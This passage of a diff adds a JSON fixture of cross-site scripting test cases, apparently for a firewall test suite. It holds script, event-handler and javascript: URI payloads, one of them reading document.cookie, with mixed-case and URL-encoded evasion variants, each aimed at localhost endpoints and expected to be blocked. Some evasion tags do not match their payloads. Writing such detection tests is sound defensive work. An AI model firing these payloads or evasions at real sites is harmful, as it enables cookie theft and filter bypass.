@@ -1,0 +1,2622 @@
+[
+  {
+    "id": "xss-0001",
+    "class": "xss",
+    "name": "XSS query:name [urlencode]",
+    "description": "Cross-site scripting via query:name: <script>alert(1)</script>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0002",
+    "class": "xss",
+    "name": "XSS body:comment [urlencode]",
+    "description": "Cross-site scripting via body:comment: <script>alert(1)</script>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"<script>alert(1)</script>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0003",
+    "class": "xss",
+    "name": "XSS body:display_name [raw]",
+    "description": "Cross-site scripting via body:display_name: <script>alert(1)</script>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/api/profile",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\": \"<script>alert(1)</script>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0004",
+    "class": "xss",
+    "name": "XSS body:preferences [raw]",
+    "description": "Cross-site scripting via body:preferences: <script>alert(1)</script>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/user/settings",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"preferences\": {\"notifications\": \"<script>alert(1)</script>\"}}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0005",
+    "class": "xss",
+    "name": "XSS query:name [mixed-case]",
+    "description": "Cross-site scripting via query:name: <img src=x onerror=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=<ImG SrC=X OnErRoR=AlErT(1)>",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0006",
+    "class": "xss",
+    "name": "XSS body:comment [raw]",
+    "description": "Cross-site scripting via body:comment: <img src=x onerror=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"<img src=x onerror=alert(1)>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0007",
+    "class": "xss",
+    "name": "XSS body:display_name [mixed-case]",
+    "description": "Cross-site scripting via body:display_name: <img src=x onerror=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/api/profile",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\": \"<img src=x onerror=alert(1)>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0008",
+    "class": "xss",
+    "name": "XSS body:preferences [double-urlencode]",
+    "description": "Cross-site scripting via body:preferences: <img src=x onerror=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/user/settings",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"preferences\": {\"notifications\": \"<img src=x onerror=alert(1)>\"}}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0009",
+    "class": "xss",
+    "name": "XSS query:name [urlencode]",
+    "description": "Cross-site scripting via query:name: <svg onload=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=%3Csvg%20onload%3Dalert%281%29%3E",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0010",
+    "class": "xss",
+    "name": "XSS body:comment [raw]",
+    "description": "Cross-site scripting via body:comment: <svg onload=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"<svg onload=alert(1)>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0011",
+    "class": "xss",
+    "name": "XSS body:display_name [raw]",
+    "description": "Cross-site scripting via body:display_name: <svg onload=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/api/profile",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\": \"<svg onload=alert(1)>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0012",
+    "class": "xss",
+    "name": "XSS body:preferences [urlencode]",
+    "description": "Cross-site scripting via body:preferences: <svg onload=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/user/settings",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"preferences\": {\"notifications\": \"<svg onload=alert(1)>\"}}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0013",
+    "class": "xss",
+    "name": "XSS query:name [mixed-case]",
+    "description": "Cross-site scripting via query:name: \"><script>alert(document.cookie)</script",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=\"><ScRiPt>aLeRt(dOcUmEnT.CoOkIe)</sCrIpT>",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0014",
+    "class": "xss",
+    "name": "XSS body:comment [urlencode]",
+    "description": "Cross-site scripting via body:comment: \"><script>alert(document.cookie)</script",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"\\\"><script>alert(document.cookie)</script>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0015",
+    "class": "xss",
+    "name": "XSS body:display_name [raw]",
+    "description": "Cross-site scripting via body:display_name: \"><script>alert(document.cookie)</script",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/api/profile",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\": \"\\\"><script>alert(document.cookie)</script>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0016",
+    "class": "xss",
+    "name": "XSS body:preferences [mixed-case]",
+    "description": "Cross-site scripting via body:preferences: \"><script>alert(document.cookie)</script",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/user/settings",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"preferences\": {\"notifications\": \"\\\"><script>alert(document.cookie)</script>\"}}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0017",
+    "class": "xss",
+    "name": "XSS query:name [raw]",
+    "description": "Cross-site scripting via query:name: javascript:alert(1)",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=javascript:alert(1)",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0018",
+    "class": "xss",
+    "name": "XSS body:comment [raw]",
+    "description": "Cross-site scripting via body:comment: javascript:alert(1)",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"javascript:alert(1)\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0019",
+    "class": "xss",
+    "name": "XSS body:display_name [raw]",
+    "description": "Cross-site scripting via body:display_name: javascript:alert(1)",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/api/profile",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\": \"javascript:alert(1)\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0020",
+    "class": "xss",
+    "name": "XSS body:preferences [mixed-case]",
+    "description": "Cross-site scripting via body:preferences: javascript:alert(1)",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/user/settings",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"preferences\": {\"notifications\": \"javascript:alert(1)\"}}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0021",
+    "class": "xss",
+    "name": "XSS query:name [urlencode]",
+    "description": "Cross-site scripting via query:name: <body onload=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=%3Cbody%20onload%3Dalert%281%29%3E",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0022",
+    "class": "xss",
+    "name": "XSS body:comment [mixed-case]",
+    "description": "Cross-site scripting via body:comment: <body onload=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"<body onload=alert(1)>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0023",
+    "class": "xss",
+    "name": "XSS body:display_name [raw]",
+    "description": "Cross-site scripting via body:display_name: <body onload=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/api/profile",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\": \"<body onload=alert(1)>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0024",
+    "class": "xss",
+    "name": "XSS body:preferences [double-urlencode]",
+    "description": "Cross-site scripting via body:preferences: <body onload=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/user/settings",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"preferences\": {\"notifications\": \"<body onload=alert(1)>\"}}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0025",
+    "class": "xss",
+    "name": "XSS query:name [mixed-case]",
+    "description": "Cross-site scripting via query:name: <iframe src=javascript:alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=<IfRaMe sRc=jAvAsCrIpT:AlErT(1)>",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0026",
+    "class": "xss",
+    "name": "XSS body:comment [double-urlencode]",
+    "description": "Cross-site scripting via body:comment: <iframe src=javascript:alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"<iframe src=javascript:alert(1)>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0027",
+    "class": "xss",
+    "name": "XSS body:display_name [raw]",
+    "description": "Cross-site scripting via body:display_name: <iframe src=javascript:alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/api/profile",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\": \"<iframe src=javascript:alert(1)>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0028",
+    "class": "xss",
+    "name": "XSS body:preferences [raw]",
+    "description": "Cross-site scripting via body:preferences: <iframe src=javascript:alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/user/settings",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"preferences\": {\"notifications\": \"<iframe src=javascript:alert(1)>\"}}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0029",
+    "class": "xss",
+    "name": "XSS query:name [double-urlencode]",
+    "description": "Cross-site scripting via query:name: <a href=\"javascript:alert(1)\">x</a>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=%253Ca%2520href%253D%2522javascript%253Aalert%25281%2529%2522%253Ex%253C%252Fa%253E",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0030",
+    "class": "xss",
+    "name": "XSS body:comment [urlencode]",
+    "description": "Cross-site scripting via body:comment: <a href=\"javascript:alert(1)\">x</a>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"<a href=\\\"javascript:alert(1)\\\">x</a>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0031",
+    "class": "xss",
+    "name": "XSS body:display_name [double-urlencode]",
+    "description": "Cross-site scripting via body:display_name: <a href=\"javascript:alert(1)\">x</a>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/api/profile",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\": \"<a href=\\\"javascript:alert(1)\\\">x</a>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0032",
+    "class": "xss",
+    "name": "XSS body:preferences [double-urlencode]",
+    "description": "Cross-site scripting via body:preferences: <a href=\"javascript:alert(1)\">x</a>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/user/settings",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"preferences\": {\"notifications\": \"<a href=\\\"javascript:alert(1)\\\">x</a>\"}}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0033",
